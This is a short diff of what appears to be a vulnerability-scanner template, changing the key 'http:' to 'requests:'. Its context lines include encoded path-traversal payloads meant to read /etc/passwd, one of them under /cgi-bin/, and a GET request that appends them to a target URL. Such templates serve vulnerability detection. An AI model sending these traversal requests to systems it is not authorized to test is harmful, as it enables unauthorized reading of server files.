@@ -15,7 +15,7 @@ variables:
     /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
     /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}{{payloads}}"
